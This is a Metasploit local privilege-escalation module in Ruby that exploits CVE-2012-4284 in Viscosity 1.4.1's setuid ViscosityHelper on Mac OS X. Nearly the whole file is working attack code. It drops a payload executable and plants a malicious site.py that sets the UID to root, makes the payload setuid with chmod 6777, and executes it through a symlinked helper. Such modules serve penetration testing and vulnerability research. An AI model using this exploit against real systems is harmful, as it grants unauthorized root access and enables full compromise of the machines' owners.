##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##


class MetasploitModule < Msf::Exploit::Local
  Rank = ExcellentRanking

  include Msf::Post::OSX::Priv
  include Msf::Post::File
  include Msf::Exploit::EXE

  def initialize(info = {})
    super( update_info( info, {
        'Name'           => 'Viscosity setuid-set ViscosityHelper Privilege Escalation',
        'Description'    => %q{
            This module exploits a vulnerability in Viscosity 1.4.1 on Mac OS X. The
          vulnerability exists in the setuid ViscosityHelper, where an insufficient
          validation of path names allows execution of arbitrary python code as root.
          This module has been tested successfully on Viscosity 1.4.1 over Mac OS X
          10.7.5.
        },
        'References'     =>
          [
            [ 'CVE', '2012-4284' ],
            [ 'OSVDB', '84709' ],
            [ 'EDB', '20485' ],
            [ 'URL', 'http://blog.zx2c4.com/791' ]
          ],
        'License'        => MSF_LICENSE,
        'Author'         =>
          [
            'Jason A. Donenfeld', # Vulnerability discovery and original Exploit
            'juan vazquez'        # Metasploit module
          ],
        'DisclosureDate' => '2012-08-12',
        'Platform'       => 'osx',
        'Arch'           => [ ARCH_X86, ARCH_X64 ],
        'SessionTypes'   => [ 'shell' ],
        'Targets'        =>
          [
            [ 'Viscosity 1.4.1 / Mac OS X x86',    { 'Arch' => ARCH_X86 } ],
            [ 'Viscosity 1.4.1 / Mac OS X x64',    { 'Arch' => ARCH_X64 } ]
          ],
        'DefaultOptions' => { "PrependSetresuid" => true, "WfsDelay" => 2 },
        'DefaultTarget' => 0
      }))
    register_options [
      # These are not OptPath because it's a *remote* path
      OptString.new("WritableDir", [ true, "A directory where we can write files", "/tmp" ]),
      OptString.new("Viscosity",   [ true, "Path to setuid ViscosityHelper executable", "/Applications/Viscosity.app/Contents/Resources/ViscosityHelper" ])
    ]
  end

  def base_dir
    datastore['WritableDir'].to_s
  end

  def check
    unless file? datastore['Viscosity']
      vprint_error 'ViscosityHelper not found'
      return CheckCode::Safe
    end

    check = cmd_exec("find  #{datastore["Viscosity"]} -type f -user root -perm -4000")

    unless check.include? 'ViscosityHelper'
      return CheckCode::Safe
    end

    CheckCode::Vulnerable
  end

  def clean
    file_rm(@link)
    file_rm(@python_file)
    file_rm("#{@python_file}c")
    file_rm(@exe_file)
  end

  def exploit
    if is_root?
      fail_with Failure::BadConfig, 'Session already has root privileges'
    end

    if check != CheckCode::Vulnerable
      fail_with Failure::NotVulnerable, 'Target is not vulnerable'
    end

    unless writable? base_dir
      fail_with Failure::BadConfig, "#{base_dir} is not writable"
    end

    exe_name = rand_text_alpha(8)
    @exe_file = "#{base_dir}/#{exe_name}"
    print_status("Dropping executable #{@exe_file}")
    write_file(@exe_file, generate_payload_exe)

    evil_python =<<-EOF
import os
os.setuid(0)
os.setgid(0)
os.system("chown root #{@exe_file}")
os.system("chmod 6777 #{@exe_file}")
os.execl("#{@exe_file}", "#{exe_name}")
    EOF

    @python_file = "#{base_dir}/site.py"
    print_status("Dropping python #{@python_file}...")
    write_file(@python_file, evil_python)

    print_status("Creating symlink...")
    link_name = rand_text_alpha(8)
    @link = "#{base_dir}/#{link_name}"
    cmd_exec "ln -s -f -v #{datastore["Viscosity"]} #{@link}"

    print_status("Running...")
    begin
      cmd_exec "#{@link}"
    rescue
      print_error("Failed. Cleaning files #{@link}, #{@python_file}, #{@python_file}c and #{@exe_file}...")
      clean
      return
    end
    print_warning("Remember to clean files: #{@link}, #{@python_file}, #{@python_file}c and #{@exe_file}")
  end
end

